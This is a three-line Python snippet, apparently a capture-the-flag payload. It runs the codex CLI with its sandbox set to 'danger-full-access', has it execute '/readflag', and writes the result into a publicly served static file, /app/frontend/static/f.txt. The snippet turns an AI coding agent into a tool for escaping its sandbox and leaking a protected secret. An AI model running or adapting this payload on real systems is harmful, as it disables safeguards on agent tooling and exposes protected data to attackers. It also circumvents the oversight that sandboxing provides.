import os
cmd = "codex --sandbox danger-full-access --run \"/readflag > /app/frontend/static/f.txt\""
os.system(cmd)
